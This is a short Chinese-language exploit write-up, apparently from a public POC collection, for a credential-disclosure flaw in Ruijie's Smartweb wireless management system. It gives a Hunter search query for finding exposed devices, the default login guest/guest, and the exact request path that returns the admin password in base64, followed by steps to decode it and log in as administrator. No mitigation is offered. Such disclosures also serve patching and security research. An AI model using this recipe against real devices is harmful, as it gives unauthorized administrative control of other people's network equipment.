# 锐捷 Smartweb管理系统密码信息泄漏漏洞

# 一、漏洞描述
锐捷网络股份有限公司无线smartweb管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。

# 二、影响版本
+ 锐捷网络股份有限公司 无线smartweb管理系统

# 三、资产测绘
+ hunter`app.name="Ruijie 锐捷 Smartweb"`
+ 登录页面

![1693026690199-64fbe35e-4db9-4483-9ff4-60fd93531a2c.png](./img/oFjWwQcPR9lcz4hK/1693026690199-64fbe35e-4db9-4483-9ff4-60fd93531a2c-137226.png)

# 四、漏洞复现
1. 使用默认口令`guest/guest`登录系统

![1693026732018-95d1a5fe-3731-47f8-8189-98cdf821d914.png](./img/oFjWwQcPR9lcz4hK/1693026732018-95d1a5fe-3731-47f8-8189-98cdf821d914-202998.png)

2. 使用poc获取管理员`admin`账号密码

```plain
http://xx.xx.xx.xx/web/xml/webuser-auth.xml
```

![1693026854163-84e6635e-5d9e-4385-8fa9-f31a26f91988.png](./img/oFjWwQcPR9lcz4hK/1693026854163-84e6635e-5d9e-4385-8fa9-f31a26f91988-063470.png)

3. base64解码后获取账号密码

![1693026884669-f6bba353-350f-48bc-b932-424eb8363d40.png](./img/oFjWwQcPR9lcz4hK/1693026884669-f6bba353-350f-48bc-b932-424eb8363d40-016540.png)

4. 使用获取的管理账号admin登录系统

![1693026933284-ae25c0ab-b1fb-448a-8f3b-60bd2c8b9798.png](./img/oFjWwQcPR9lcz4hK/1693026933284-ae25c0ab-b1fb-448a-8f3b-60bd2c8b9798-589008.png)



> 更新: 2024-06-24 11:42:27  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/elegkbnby3vipdi9>